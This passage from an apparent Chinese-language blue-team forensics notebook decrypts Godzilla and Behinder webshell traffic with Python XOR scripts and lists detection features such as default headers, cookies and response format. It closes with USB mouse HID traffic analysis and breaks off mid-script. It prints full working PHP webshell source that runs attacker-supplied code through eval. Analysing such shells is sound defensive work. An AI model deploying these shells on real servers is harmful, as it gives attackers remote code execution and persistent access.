pgCdyFGdz9lbvl2czV2cApQD'
            )
        )
    )
);
?>
```

将代码反转base64解码输出

![](https://cdn.nlark.com/yuque/0/2025/png/27875807/1739168321098-f2f64e8b-247b-45dd-b45f-41b6927df689.png)

 首先检查 `$_POST['key']` 是否存在，如果存在，则会对其进行解密（首先使用 base64 解码，然后使用密钥 `3c6e0b8a9c15224a` 进行 XOR 解密）。  

```php
<?php
eval(
@session_start();  // 启动会话
@set_time_limit(0);  // 设置脚本的最大执行时间为无限制
@error_reporting(0);  // 关闭错误报告

function encode($D, $K) {  // 定义一个加密/解密函数，基于 XOR 加密
    for ($i = 0; $i < strlen($D); $i++) {
        $c = $K[$i + 1 & 15];  // 获取密钥中的字节（16字节循环）
        $D[$i] = $D[$i] ^ $c;  // 使用 XOR 对数据进行加密
    }
    return $D;  // 返回加密后的数据
}

$pass = 'key';  // 密码字段
$payloadName = 'payload';  // 用于存储数据的会话变量名
$key = '3c6e0b8a9c15224a';  // 密钥

if (isset($_POST[$pass])) {  // 如果 POST 请求中存在 'key' 字段
    $data = encode(base64_decode($_POST[$pass]), $key);  // 解密传入的数据

    if (isset($_SESSION[$payloadName])) {  // 如果会话中存在 'payload' 数据
        $payload = encode($_SESSION[$payloadName], $key);  // 解密会话中的 'payload'

        if (strpos($payload, "getBasicsInfo") === false) {  // 如果 'payload' 中不包含 'getBasicsInfo'
            $payload = encode($payload, $key);  // 重新加密 'payload'
        }
        eval($payload);  // 执行 'payload' 中的 PHP 代码
        echo substr(md5($pass . $key), 0, 16);  // 输出密钥的 MD5 前16位
        echo base64_encode(encode(@run($data), $key));  // 执行解密后的命令并输出加密后的结果
        echo substr(md5($pass . $key), 16);  // 输出密钥的 MD5 后16位
    } else {  // 如果会话中不存在 'payload'
        if (strpos($data, "getBasicsInfo") !== false) {  // 如果传入的数据包含 'getBasicsInfo'
            $_SESSION[$payloadName] = encode($data, $key);  // 将数据加密并存储到会话中
        }
    }
}
);
?>

```

拿到密钥3c6e0b8a9c15224a，用ai写个脚本，还原明文

![](https://cdn.nlark.com/yuque/0/2025/png/27875807/1739169761647-521fcf24-d3c2-425e-8535-7e9395642c3e.png)



php_eval_xor_base64解密脚本

```python
import base64
import gzip
import json

def XOR(D, K):
    result = []
    for i in range(len(D)):
        c = K[i + 1 & 15]
        if not isinstance(D[i], int):
            d = ord(D[i])
        else:
            d = D[i]
        result.append(d ^ ord(c))
    return b''.join([i.to_bytes(1, byteorder='big') for i in result])

def try_gzip_decompress(data):
    """尝试解压gzip格式的数据"""
    try:
        return gzip.decompress(data)
    except Exception as e:
        print(f"Gzip decompression failed: {e}")
        return data

def try_json_parse(data):
    """尝试将数据解析为JSON格式"""
    try:
        return json.loads(data.decode('utf-8'))
    except Exception as e:
        print(f"JSON parse failed: {e}")
        return None

def pretty_print_data(data):
    """格式化输出数据"""
    # 尝试解压 gzip 数据
    decompressed_data = try_gzip_decompress(data)

    # 尝试将数据解析为 JSON 格式
    json_data = try_json_parse(decompressed_data)

    if json_data:
        print("JSON Data:")
        print(json.dumps(json_data, indent=4))
    else:
        # 如果数据不可解析为 JSON，尝试直接输出为可打印字符
        try:
            decoded_str = decompressed_data.decode('utf-8')
            print("Decoded String:")
            print(decoded_str)
        except UnicodeDecodeError:
            print("Raw binary data (could not decode to UTF-8):")
            print(decompressed_data)

if __name__ == '__main__':
    text = ""  # 你的 base64 编码的加密文本
    key = "3c6e0b8a9c15224a"

    # 解密数据
    decrypted_data = XOR(base64.b64decode(text), key)

    # 输出格式化后的数据
    pretty_print_data(decrypted_data)

```

解出来是这样的

![](https://cdn.nlark.com/yuque/0/2025/png/27875807/1739169827450-1230fdab-73e2-4d27-9db7-64a9af1a1d70.png)

解第二个数据包

![](https://cdn.nlark.com/yuque/0/2025/png/27875807/1739171194237-9c64c38f-88f1-4cb0-a5d8-469b09e986d8.png)

得到明文：methodNametest，输出该值为哥斯拉首次连接服务器

![](https://cdn.nlark.com/yuque/0/2025/png/27875807/1739171174384-60e51fa8-f0a0-483c-afaf-9f284b60a44a.png)

接着以此输出即可还原哥斯拉执行的命令

![](https://cdn.nlark.com/yuque/0/2025/png/27875807/1739171976397-1c25a052-ccb4-4504-8217-af8c61358b77.png)



http头问题，哥斯拉不会随机生成ua头，头可自定义，哥斯拉的默认头会有这三个参数

```php
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
```

![](https://cdn.nlark.com/yuque/0/2025/png/27875807/1739172513141-847eb9fd-0600-428a-956b-4b85423d3af2.png)







返回包内容

在第一次请求后，shell会返回一个cookie，之后的包都附有该cookie

![](https://cdn.nlark.com/yuque/0/2025/png/27875807/1739172131649-58caf2c4-1ab1-4e15-82f2-6ad71d9d3da2.png)

返回包内容

整个响应包的结构体征为：md5前十六位+base64+md5后十六位。

![](https://cdn.nlark.com/yuque/0/2025/png/27875807/1739179517676-c352b25b-57ac-4655-baf1-ddeef1ab131a.png)



```php
72a9c691ccdaab98 //前16
fL1tMGI4YTljMrBg81riA2+LkhtaVubzM+ub/0OjPOWowGSj47AnumcUZdrt+y/btb8po8/Q3Mn9UtdqUU5Quvf0V7TSLit64t+JmGKCJ6BBlf05bvbjGqo+N18oZ0qOgessXErEloGrbCi7QD4nY6p9MZQpagz8HYb+hfBn2SZmkM4qOfH0TwGuv3JOqVrLyFLu7L5mBSKiIRtak/CTH6Ll4I6LcJ99IvG+b1V4Yn40c+6b5NxmM2yMFJK3YqqimAg3SBpvXcnmUi14XBIqCl6PljTcyBXvL2YD1661nALyR3nnd86pWqoIigXOBaVR0PCXQ4KWCQX3AsC0slde4Uvxah5dSP/RGaWboWXuLX3Lh/MGdsjTnDhoSyHLpfIDrvdrKmBi6VLuDGrBBNcdUvUKasWYdRf/lU3byefB0359hg+lHIT8ZSNBc9RUPjLC9rBSKbRB8n05f+GE5oWvDNPdmDCx4Zemgjo8sj1M+zBjNg==
b4c4e1f6ddd2a488 //后16
```

```python
import base64
import hashlib
import gzip

def XOR(D, K):
    """XOR 解密函数"""
    result = []
    for i in range(len(D)):
        c = K[i + 1 & 15]  # 使用密钥的对应字符进行异或操作
        if not isinstance(D[i], int):
            d = ord(D[i])
        else:
            d = D[i]
        result.append(d ^ ord(c))  # XOR 解密
    return b''.join([i.to_bytes(1, byteorder='big') for i in result])

def split_md5_and_base64(text):
    """将 MD5 和 Base64 数据分开"""
    md5_first = text[:16]  # 前16位 MD5
    base64_data = text[16:-16]  # 中间部分 base64 编码数据
    md5_last = text[-16:]  # 后16位 MD5
    return md5_first, base64_data, md5_last

def try_gzip_decompress(data):
    """尝试解压gzip格式的数据"""
    try:
        return gzip.decompress(data)
    except Exception as e:
        print(f"Gzip decompression failed: {e}")
        return data

def pretty_print_data(data):
    """格式化输出数据"""
    # 尝试解压 gzip 数据
    decompressed_data = try_gzip_decompress(data)
    
    # 输出解压后的数据
    try:
        decoded_str = decompressed_data.decode('utf-8')
        print("Decoded String:")
        print(decoded_str)
    except UnicodeDecodeError:
        print("Raw binary data (could not decode to UTF-8):")
        print(decompressed_data)

if __name__ == '__main__':
    text = ""  # 示例输入
    key = "密钥"

    # 提取 MD5 和 Base64 数据
    md5_first, base64_data, md5_last = split_md5_and_base64(text)
    print("MD5 First 16 bytes:", md5_first)
    print("MD5 Last 16 bytes:", md5_last)

    # 解密中间的 Base64 数据
    decoded_base64_data = base64.b64decode(base64_data)  # 解码 Base64 数据
    decrypted_data = XOR(decoded_base64_data, key)  # 解密

    # 输出解压和解密后的数据
    pretty_print_data(decrypted_data)

```

![](https://cdn.nlark.com/yuque/0/2025/png/27875807/1739179499754-26b6dad8-ff65-499e-81db-cae21f8e3666.png)





总结

特征1：请求体特征，两个参数两个值，其中密码的参数值没有加密，值通过url解码、字符串反转、base64解码操作，key参数加密，密钥在密码参数中，解密通过xor运算，base64给服务器执行。

![](https://cdn.nlark.com/yuque/0/2025/png/27875807/1739173393032-e5cf6ebb-ccc0-451b-ad8f-b96846e6135f.png)



特征2：哥斯拉首次连接后返回cookie，之后的包都附有该cookie

![](https://cdn.nlark.com/yuque/0/2025/png/27875807/1739173680329-fb39a7e0-42ac-46f7-aa2c-3a73103a73e2.png)

特征3：固定的请求头

![](https://cdn.nlark.com/yuque/0/2025/png/27875807/1739241869380-8222b964-8ca8-4458-8167-750f36822d28.png)

特征4：返回体固定格式 md5前十六位+base64+md5后十六位

![](https://cdn.nlark.com/yuque/0/2025/png/27875807/1739241966545-5fc7d465-7d32-4a9a-9e08-5857a95afd93.png)



<h3 id="B5Uvt">Webshell Godzilla PHP（php_xor_base64）</h3>
哥斯拉默认生成的php_xor_base64webshell长这样，这里的$pass='pass'，表示哥斯拉在生成马子时密码是pass，而密钥是key='1234567890123456'

```php
<?php
@session_start();
@set_time_limit(0);
@error_reporting(0);
function encode($D,$K){
    for($i=0;$i<strlen($D);$i++) {
        $c = $K[$i+1&15];
        $D[$i] = $D[$i]^$c;
    }
    return $D;
}
$pass='pass';
$payloadName='payload';
$key='1234567890123456';
if (isset($_POST[$pass])){
    $data=encode(base64_decode($_POST[$pass]),$key);
    if (isset($_SESSION[$payloadName])){
        $payload=encode($_SESSION[$payloadName],$key);
        if (strpos($payload,"getBasicsInfo")===false){
            $payload=encode($payload,$key);
        }
		eval($payload);
        echo substr(md5($pass.$key),0,16);
        echo base64_encode(encode(@run($data),$key));
        echo substr(md5($pass.$key),16);
    }else{
        if (strpos($data,"getBasicsInfo")!==false){
            $_SESSION[$payloadName]=encode($data,$key);
        }
    }
}

```



数据包首个请求包，跟php eval xor base64生成的马不同，此时只有一个参数，cmd（密码），而php eval xor base64的一句话木马有两个参数，一个密码，一个密钥

![](https://cdn.nlark.com/yuque/0/2025/png/27875807/1739254989028-856eef4c-6593-4321-85e2-b210152ace33.png)

只有一个密码是无法分析数据包的加密内容的，除非攻击者使用了哥斯拉的默认密钥key，这时候需要到服务器上去下载webshell，webshell中有我们需要的密钥。

![](https://cdn.nlark.com/yuque/0/2025/png/27875807/1739255331092-7e47a4af-4da3-4ceb-903f-dfe583b44e8b.png)

回到服务器，拿到密钥9003d1df22eb4d38

![](https://cdn.nlark.com/yuque/0/2025/png/27875807/1739255492275-c98e3a1b-fee6-4aac-9777-d455b200d501.png)

修改代码的密钥，即可输出明文

![](https://cdn.nlark.com/yuque/0/2025/png/27875807/1739255641214-84f9b01d-2871-4430-8b1d-52fd429930dc.png)

```python
import base64
import gzip
import json

def XOR(D, K):
    result = []
    for i in range(len(D)):
        c = K[i + 1 & 15]
        if not isinstance(D[i], int):
            d = ord(D[i])
        else:
            d = D[i]
        result.append(d ^ ord(c))
    return b''.join([i.to_bytes(1, byteorder='big') for i in result])

def try_gzip_decompress(data):
    """尝试解压gzip格式的数据"""
    try:
        return gzip.decompress(data)
    except Exception as e:
        print(f"Gzip decompression failed: {e}")
        return data

def try_json_parse(data):
    """尝试将数据解析为JSON格式"""
    try:
        return json.loads(data.decode('utf-8'))
    except Exception as e:
        print(f"JSON parse failed: {e}")
        return None

def pretty_print_data(data):
    """格式化输出数据"""
    # 尝试解压 gzip 数据
    decompressed_data = try_gzip_decompress(data)

    # 尝试将数据解析为 JSON 格式
    json_data = try_json_parse(decompressed_data)

    if json_data:
        print("JSON Data:")
        print(json.dumps(json_data, indent=4))
    else:
        # 如果数据不可解析为 JSON，尝试直接输出为可打印字符
        try:
            decoded_str = decompressed_data.decode('utf-8')
            print("Decoded String:")
            print(decoded_str)
        except UnicodeDecodeError:
            print("Raw binary data (could not decode to UTF-8):")
            print(decompressed_data)

if __name__ == '__main__':
    text = "L7s7ZDFkZjIyZSn6KcLx9XtVYQNRBE78YrUvYjR5dmhg4hwvHbZJHR2yrRyt/ulugv4aMuGpL2ZgVdBnV/91FPn4fJV6qCtX0GOIfsl7dU/+//4p/S9nMvQp0t8pMzg5"  # 你的 base64 编码的加密文本
    key = "9003d1df22eb4d38"

    # 解密数据
    decrypted_data = XOR(base64.b64decode(text), key)

    # 输出格式化后的数据
    pretty_print_data(decrypted_data)

```



![](https://cdn.nlark.com/yuque/0/2025/png/27875807/1739255752275-7a8d2050-5939-4a6a-9b46-4fa6446d108c.png)



返回包

```python
import base64
import hashlib
import gzip

def XOR(D, K):
    """XOR 解密函数"""
    result = []
    for i in range(len(D)):
        c = K[i + 1 & 15]  # 使用密钥的对应字符进行异或操作
        if not isinstance(D[i], int):
            d = ord(D[i])
        else:
            d = D[i]
        result.append(d ^ ord(c))  # XOR 解密
    return b''.join([i.to_bytes(1, byteorder='big') for i in result])

def split_md5_and_base64(text):
    """将 MD5 和 Base64 数据分开"""
    md5_first = text[:16]  # 前16位 MD5
    base64_data = text[16:-16]  # 中间部分 base64 编码数据
    md5_last = text[-16:]  # 后16位 MD5
    return md5_first, base64_data, md5_last

def try_gzip_decompress(data):
    """尝试解压gzip格式的数据"""
    try:
        return gzip.decompress(data)
    except Exception as e:
        print(f"Gzip decompression failed: {e}")
        return data

def pretty_print_data(data):
    """格式化输出数据"""
    # 尝试解压 gzip 数据
    decompressed_data = try_gzip_decompress(data)
    
    # 输出解压后的数据
    try:
        decoded_str = decompressed_data.decode('utf-8')
        print("Decoded String:")
        print(decoded_str)
    except UnicodeDecodeError:
        print("Raw binary data (could not decode to UTF-8):")
        print(decompressed_data)

if __name__ == '__main__':
    text = "9dc6aa19a0e77159L7s7ZDFkZjIyZgegv73aASC23Jcl9ZDk1rG/KJ49eUM3OXvw4V/Fj4MpgLQTT/DjfkfTjYb4ZuGR8CJG2oxkXKdPCFcqvU7N57pQ7ZHNVA9LeiXwD/dPw23nekq3asgFIZzhrpmiKL4X10SO+k8XjrnPdIim37oNRrG9n2vM/baS5xcaTB2X7T1OXb32VIemf8HHvWoRPGFbum/hNF7Hh+1Kdt76ak9snLJnlBylPPAcuCQtIbvDDhlrQnn3agzKji09Xc/luYDQntBsw1gPO0HUmIkXuXnCFBLGeO+M6ttb0kt6daW1b+pKFR1sb229r6WCE09PUb2O/3tGgCcPpJwcYLaJ0D95F1twdw/VztlpFtsxeI6gZmTPfHPZlur5LAy14ay1h2IYgY4s0tQORbSoY854KenvW0f3qDieoR1hjLtyYIb/uYMx1oNAZYyY91T236uG8OoBpYLBm4qFTIZK7N1ncD/UBHYcJHlNRke2VxjcphutQ4upVRRQnqAN5bk+aEc7CIAPBVrZRGo0STNp+anuyjNBHbLIlqIfTdx6x0PGH0BN3eSUSBYzt8sGn5xut2pXhJ0G8G1eRKDTqRTyMqxlwgOLa1pmd1ot48UtrvIaTZQ28QpQ3XDOKtnVygXxkZJnZwH71WmLsTgkNTBKsW6US/4B88k5bVbsQWT7JZrVEZlW9XIr8qb55LpsNkxwdNraDn2Zq/swX3A4tjb8V7/oX/ywlw0hDgqCaex/CjnOgsdAHBUz7QdL3ghj7A1qAl5jlklIhpDwACz+eCI3YKuc97DKpfhCVMEHfQyBJLJHS6X3MOV/oWU/sljH1fzhQ0Vhd2fEtzBgEambYznUBa/RVRYxeVAIWO/9/KUhm6eYcZt+F6NdeJ/9D5kL75JP+ZDSMEp+7wwT5ZN1lXeqof4CLTdzKSvlf+DdVz4aqVtdzNXlLlXH82FbmrynWtQlaE5TH87Isa6ZIW+YsZwhyxEBiW7qYht6FsdZ7jD/rKbS6Yl/aUAXTBW4Y7eh5k2oYwHAx2q+G379ibJitsfdhD/CYvsbphflIR7MOUj+aBlWNGRm5b7a4790a1611dea"  # 示例输入
    key = "9003d1df22eb4d38"

    # 提取 MD5 和 Base64 数据
    md5_first, base64_data, md5_last = split_md5_and_base64(text)
    print("MD5 First 16 bytes:", md5_first)
    print("MD5 Last 16 bytes:", md5_last)

    # 解密中间的 Base64 数据
    decoded_base64_data = base64.b64decode(base64_data)  # 解码 Base64 数据
    decrypted_data = XOR(decoded_base64_data, key)  # 解密

    # 输出解压和解密后的数据
    pretty_print_data(decrypted_data)

```

![](https://cdn.nlark.com/yuque/0/2025/png/27875807/1739257532676-4fde7e8a-6d78-4656-bc3b-01df0de3364d.png)



站在中间人的视角，密码与密钥是分开的，一些安全设备就无法获知数据内容



特征1：请求体只有一个参数与值，参数是密码，值是传递的命令

![](https://cdn.nlark.com/yuque/0/2025/png/27875807/1739257661097-1d50b221-c17e-45cb-ab92-064f29f8b2e4.png)

特征2：请求头中有哥斯拉默认的请求头

![](https://cdn.nlark.com/yuque/0/2025/png/27875807/1739257723673-466d474b-6b1e-40c9-923b-cd35330e9b0c.png)

特征3：哥斯拉首次连接后会返回cookie，以后的头都带有此cookie

![](https://cdn.nlark.com/yuque/0/2025/png/27875807/1739257784054-5da8fd20-a26b-4d8a-8ee7-69de32645a72.png)

特征4：返回体固定格式 md5前十六位+base64+md5后十六位

![](https://cdn.nlark.com/yuque/0/2025/png/27875807/1739257798336-3391503f-e670-4fc2-80c5-93cf76bea743.png)





<h3 id="szlUz">Webshell Godzilla PHP （php_xor_raw）</h3>


webshell文件，只有密钥，没有密码，密码通过php://input接收输入

```php
<?php
@session_start();
@set_time_limit(0);
@error_reporting(0);
function encode($D,$K){
    for($i=0;$i<strlen($D);$i++) {
        $c = $K[$i+1&15];
        $D[$i] = $D[$i]^$c;
    }
    return $D;
}
$payloadName='payload';
$key='99024280cab824ef';
$data=file_get_contents("php://input");
if ($data!==false){
    $data=encode($data,$key);
    if (isset($_SESSION[$payloadName])){
        $payload=encode($_SESSION[$payloadName],$key);
        if (strpos($payload,"getBasicsInfo")===false){
            $payload=encode($payload,$key);
        }
		eval($payload);
        echo encode(@run($data),$key);
    }else{
        if (strpos($data,"getBasicsInfo")!==false){
            $_SESSION[$payloadName]=encode($data,$key);
        }
    }
}

```

请求包没有参数，只有值

![](https://cdn.nlark.com/yuque/0/2025/png/27875807/1739258032097-6152646a-8ca8-41f3-a444-e01483991f61.png)

解密需要密钥，密钥在webshell中，需要到服务器上去下载webshell，提取密钥

提取wireshark的data数据

![](https://cdn.nlark.com/yuque/0/2025/png/27875807/1739415961258-fac6ab15-e164-471b-b8df-00137eddc733.png)

![](https://cdn.nlark.com/yuque/0/2025/png/27875807/1739415975644-bee2b5f9-c1c4-4ebd-b678-6e70be4e2a8e.png)



解密脚本

```php
import gzip
from io import BytesIO

def encode(data, key):
    data = bytearray(data)
    key = bytearray(key.encode('utf-8'))
    for i in range(len(data)):
        c = key[(i + 1) & 15]  # 循环使用密钥
        data[i] ^= c
    return bytes(data)

def decode(encrypted_data, key):
    return encode(encrypted_data, key)

def is_gzip(data):
    # 判断数据是否是gzip格式
    return data[:2] == b'\x1f\x8b'

# 密钥
key = '99024280cab824ef'

# 单一的十六进制字符串（可能是加密或压缩数据）
encrypted_hex = '5455465c5d5c7e020c073a363465664d5c4346'

# 将十六进制字符串转换为字节
encrypted_data = bytes.fromhex(encrypted_hex)

# 解密数据
decrypted_data = decode(encrypted_data, key)

# 如果数据是gzip压缩格式，则解压缩
if is_gzip(decrypted_data):
    with gzip.GzipFile(fileobj=BytesIO(decrypted_data)) as f:
        decompressed_data = f.read()
    print("\n解压缩后的数据：")
    print(decompressed_data.decode('utf-8', errors='ignore'))
else:
    print("解密后的数据（未压缩）：")
    print(decrypted_data.decode('utf-8', errors='ignore'))

```



![](https://cdn.nlark.com/yuque/0/2025/png/27875807/1739433191400-754b6432-6b2c-46ce-8101-4e668b24ccaa.png)

返回包

返回包内容如果过长，wireshark会分两段显示，需要拼接两段的hex进行解密

![](https://cdn.nlark.com/yuque/0/2025/png/27875807/1739433520932-aa3108ab-82f7-450d-8203-439ae3f9b079.png)

![](https://cdn.nlark.com/yuque/0/2025/png/27875807/1739433384541-0b51afe2-231c-42b8-868d-eecefed36c47.png)

总结：

特征1：数据包内容为字符串形式，没有参数，直接跟值

![](https://cdn.nlark.com/yuque/0/2025/png/27875807/1739433642559-7432f3c5-7a13-42c9-aa12-175ecbec50a7.png)

特征2：请求头中有哥斯拉默认的请求头

![](https://cdn.nlark.com/yuque/0/2025/png/27875807/1739433675303-957a74a8-a9df-45fb-94f5-b2da43f51714.png)

特征3：哥斯拉首次连接后会返回cookie，以后的头部都带有此cookie

![](https://cdn.nlark.com/yuque/0/2025/png/27875807/1739433711380-ad2a2331-9ca6-4929-a4a6-aedc78e811cd.png)





<h2 id="c1GuE">冰蝎</h2>
<h3 id="ZeE7C">default PHP</h3>
Behinder_v4.1.t00ls

默认的php shell长这样，shell连接密码为md5的前16位

```php
<?php
@error_reporting(0);
session_start();
    $key="e45e329feb5d925b"; //该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond
	$_SESSION['k']=$key;
	session_write_close();
	$post=file_get_contents("php://input");
	if(!extension_loaded('openssl'))
	{
		$t="base64_"."decode";
		$post=$t($post."");
		
		for($i=0;$i<strlen($post);$i++) {
    			 $post[$i] = $post[$i]^$key[$i+1&15]; 
    			}
	}
	else
	{
		$post=openssl_decrypt($post, "AES128", $key);
	}
    $arr=explode('|',$post);
    $func=$arr[0];
    $params=$arr[1];
	class C{public function __invoke($p) {eval($p."");}}
    @call_user_func(new C(),$params);
?>

```





























<h2 id="vA5qh">Webshell 分析的一些思考</h2>
站在防守方的角度，模拟一个场景，如果有全流量设备，某天ids，ips等一些设备告警，有哥斯拉webshell连接，首先定位服务器，检查服务。。。提取webshell，可能长这样

![](https://cdn.nlark.com/yuque/0/2025/png/27875807/1739169088455-db50e086-b3d3-4eb4-b71b-3d01bf7d5cdc.png)

或者就是一句话，该如何还原流量，分析攻击者做了那些操作，导出数据包，找到第一个





<h2 id="S8lzD">USB</h2>
USB流量包括键盘流量和鼠标流量

USB流量指的是USB设备接口的流量，攻击者能够通过监听usb接口流量获取键盘敲击键、鼠标移动与点击、存储设备的铭文传输通信、USB无线网卡网络传输内容等等。在CTF中，USB流量分析主要以键盘和鼠标流量为主。在取证中，如果设备在使用时候打开了抓包软件，那么在使用过键盘或鼠标后就应有完整记录，用于取证。

通过wireshark或USBPcap捕获usb数据

[https://wiki.wireshark.org/CaptureSetup/USB](https://wiki.wireshark.org/CaptureSetup/USB)



一个USB包，其中源地址是host，代表主机，目的地址是2.3.0，表示目标是连接在主机上的 USB 设备，设备的地址为 2.3.0。

![](https://cdn.nlark.com/yuque/0/2024/png/27875807/1735285441333-96ebfe16-f7d2-442b-bcdb-ffe94e5e1b58.png)



1. 数据包基础信息
    1.  帧大小  
    2. 捕获接口
2. USB信息（URB（USB Request Block）是主机与 USB 设备通信的基本单元。此处的关键字段）
    1. IRP （I/O Request Packet 是主机用于管理请求的唯一标识符。值为 0 表示这是捕获中的初始请求。）
    2. USBD_STATUS（主机成功创建了请求并将其发送至设备。）
    3.  URB Function（请求类型为获取设备描述符）
    4. Endpoint（表示通信方向为 IN，主机从设备获取数据。）
    5.  URB transfer type  （此请求是 USB 控制传输的一部分）
3. 控制传输阶段

USB 控制传输由 3 个阶段组成：**Setup、Data、Status**。此数据包处于 Setup阶段

    1. **bmRequestType**: 0x80
        1. 位字段解析：0b10000000
            1. 第7位（传输方向）: 1（IN，主机将从设备获取数据）。
            2. 第5-6位（类型）: 0（标准请求）。
            3. 第0-4位（接收方）: 0（设备级别请求）。
    2. **bRequest**: GET DESCRIPTOR (6)  
表明主机请求设备描述符。
    3. **Descriptor Index**: 0x00  
请求的索引为 0，表示获取设备的第一个描述符。
    4. **bDescriptorType**: DEVICE (0x01)  
请求的描述符类型为设备描述符。
    5. **Language Id**: 0x0000  
未指定语言，默认取第一个语言描述符。
    6. **wLength**: 18  
主机期望从设备获取 18 字节的数据。这是设备描述符的固定长度。

![](https://cdn.nlark.com/yuque/0/2024/png/27875807/1735285858710-81581a32-3281-449b-91a3-a08a0740d8fa.png)



USB枚举配置阶段

1. GET DESCRIPTOR Request DEVICE  主机向设备请求 设备描述符（包括设备的厂商 ID（VID）、产品 ID（PID）、设备类、协议、以及支持的 USB 版本等）
2. GET DESCRIPTOR Response DEVICE 设备响应主机的请求，并返回 设备描述符
3. GET DESCRIPTOR Request CONFIGURATION 主机向设备请求 配置描述符（获取设备的功能配置信息，包括支持的接口数量、端点数量、供电需求等）
4. GET DESCRIPTOR Response CONFIGURATION 设备响应主机的请求，并返回 配置描述符
5. SET CONFIGURATION Request 主机发送设置请求，告知设备使用哪一个配置（激活设备的特定配置，准备进入工作模式）
6. SET CONFIGURATION Response 设备确认配置已设置成功
7.  URB_INTERRUPT in  设备通过中断端点向主机发送数据

在连接期间，主机向多个设备地址发送了以上连接步骤

![](https://cdn.nlark.com/yuque/0/2024/png/27875807/1735286927897-2a4cd3d4-bc84-4337-9e86-ff93a5a24d2e.png)

中断传输阶段

在经过正确的枚举和配置，usb已经连接上主机，进入中断传输阶段，通过分析此阶段的数据，可以一定程度上还原 USB 设备的轨迹，特别是它与主机的交互过程以及某些设备行为（如按键或鼠标移动）

![](https://cdn.nlark.com/yuque/0/2024/png/27875807/1735287435084-71d1333b-d4cf-400f-9744-4d8c59b376e2.png)

在一些数据包中可能包含Leftover Capture Data，这其实也是USB设备进行通信的数据，只是不一定遵循 HID 描述符格式，也可能是其他自定义协议数据，所以显示为Leftover Capture Data，如果只是进行分析可以简单理解HID=Leftover Capture Data。

![](https://cdn.nlark.com/yuque/0/2024/png/27875807/1735287664685-07051ea7-88d9-4d26-be0c-b29d042bbcee.png)



wireshark USB常用的过滤命令

只显示设备地址是20的设备数据包(会有一些空包)

```python
usb.device_address==20
```

下面的命令可以准确的过滤出所有的发送和接收到包(没有空包)

```python
(usb.dst=="3.6.1") || (usb.src=="3.6.2")
```

也会有空包,没有第二条命令效果好

```python
(usb.addr=="3.6.1") || (usb.addr=="3.6.2")
```

提取hid数据

```python
usbhid.data
```



**鼠标**HID

+ 常用 3-4 字节：
    - 第 1 字节：按钮状态（如左键、右键）。
    - 第 2 字节：X 轴移动。
    - 第 3 字节：Y 轴移动。
    - 第 4 字节（可选）：滚轮数据。

分析HID

HID Data: 010000200000

这段HID由12个字符组成，每两位十六进制字符表示 1 个字节。  

1. 判断usb设备类型
    1. 鼠标
    2. 键盘
    3. 其它usb设备
2. 分析



<h3 id="L8fZg">鼠标</h3>


打开一个usb数据包，分析下面信息，该数据包是设备1.5.1接口与计算机进行通信的数据记录

![](https://cdn.nlark.com/yuque/0/2025/png/27875807/1735805258835-735516dc-4890-4f21-92df-2d3740d405b5.png)

回到配置枚举阶段

![](https://cdn.nlark.com/yuque/0/2025/png/27875807/1735805454483-d307d373-c56c-4c1c-8b10-6a4a5283794a.png)



1. 检查GET DESCRIPTOR Response DEVICE

![](https://cdn.nlark.com/yuque/0/2025/png/27875807/1735805981708-89ef5aa1-90e4-4eb3-8711-655bb08e2003.png)

+ **bDeviceClass**:
+ 如果为 `0x03`，表明是 HID（Human Interface Device）设备。
+ **bDeviceSubClass**:
+ 如果为 `0x01`，说明是 Boot Interface Subclass，可能是键盘或鼠标。
+ **bDeviceProtocol**:
+ 如果为 `0x01`，说明是键盘。
+ 如果为 `0x02`，说明是鼠标。
+ 如果都为0，则表示此交互usb设备无特定说明
2. 检查GET DESCRIPTOR Response CONFIGURATION
+ **bInterfaceClass**:
+ `0x03`：说明接口属于 HID。
+ **bInterfaceSubClass**:
+ `0x01`：说明是 Boot Interface，可能是键盘或鼠标。
+ **bInterfaceProtocol**:
+ `0x01`：键盘。
+ `0x02`：鼠标。
+ 如果都为0，表示无特定说明

在这个数据包中**bInterfaceProtocol值为0x02，为鼠标 Mouse**

![](https://cdn.nlark.com/yuque/0/2025/png/27875807/1735806143050-2b66588c-1506-4283-a240-1fe4e25b5062.png)



分析数据包

该鼠标数据包，第一个通信的数据是鼠标到主机的输入

HID Data：010000000000

| 字节位置 | 描述 | 含义 |
| --- | --- | --- |
| Byte 0 | 按键状态 | 指示鼠标按钮的状态（如左键、右键按下） |
| Byte 1 | X 轴位移 | 指示鼠标在 X 轴上的相对位移 |
| Byte 2 | Y 轴位移 | 指示鼠标在 Y 轴上的相对位移 |
| Byte 3 | 滚轮 | 滚轮的滚动数据（通常为相对滚动） |
| Byte 4 | 扩展按键或状态 | 一些鼠标可能有额外的功能键，如侧键（未验证） |
| Byte 5 | 额外数据 | 可能用于 DPI 调整或厂商自定义功能（未验证） |


Byte0

值为0×00时，代表没有按键

值为0×01时，代表按左键

值为0×02时，代表当前按键为右键

值为0x03时（如果支持），左键和右键同时按下



Byte1

正值（如0x01）：代表鼠标右移像素位

负值（如0xFF）：代表鼠标左移像素位



Byte2

正值（如0x01 表示指针向上移动 1 像素）：代表鼠标上移像素位

负值（如0xFF 在二进制补码表示法中等于 -1，表示指针向下移动 1 像素）：代表鼠标下移像素位



Byte3

正值 (如 0x01): 向前滚动（向上）。

负值 (如0xFF 或 -1): 向后滚动（向下）。

0x00: 没有滚动。



其中，byte0 前两个字符01，代表按左键一次

![](https://cdn.nlark.com/yuque/0/2025/png/27875807/1735806607487-b8b3e368-29b8-4186-8196-86b3d395c05a.png)



使用python脚本进行分析，通过tshark提取usbhid数据

```python
tshark -r 111.pcapng -T fields -e usb.capdata | sed '/^\s*$/d' > usbdata.txt
tshark -r 111.pcapng -T fields -e usbhid.data | sed '/^\s*$/d' > usbdata.txt
```

提取usb鼠标流量

![](https://cdn.nlark.com/yuque/0/2025/png/27875807/1735807385990-446027df-6d16-4786-bcec-bd9484cda65d.png)

```python
import matplotlib.pyplot as plt

def parse_hid_packet(hid_packet):
    """
    解析 HID 数据包，返回 X/Y 轴位移。
    """
    # 转换为字节列表
    data = [int(hid_packet[i:i+2], 16) for i in range(0, len(hid_packet), 2)]

    # X 和 Y 轴位移
    x_movement = data[1] if data[1] <= 127 else data[1] - 256
